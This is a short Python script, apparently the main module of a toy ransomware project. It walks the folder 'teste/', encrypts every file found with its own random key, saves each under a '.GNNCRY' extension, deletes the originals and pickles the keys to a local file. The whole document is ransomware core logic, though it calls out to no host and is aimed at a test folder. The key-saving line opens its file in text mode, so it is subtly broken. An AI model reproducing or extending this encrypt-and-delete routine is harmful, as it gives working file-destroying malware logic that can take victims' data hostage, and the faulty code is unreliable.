
import get_files
import generate_keys
import encrypt
import pickle
import os

def main(path):
    files = get_files.find_files(path)
    path_n_keys = []

    for found_file in files:
        key = generate_keys.generate_key(32, True)
        
        with open(found_file, 'rb') as f:
            file_content = f.read()
        
        encrypted = encrypt.encrypt(file_content, key)

        new_file_name = found_file + ".GNNCRY"
        with open(new_file_name, 'wb') as f:
            f.write(encrypted)

        path_n_keys.append((new_file_name, key))
        os.remove(found_file)

    pickle.dump(path_n_keys, open('teste/keys.key', 'w'))

if __name__ == "__main__":
    main('teste/')

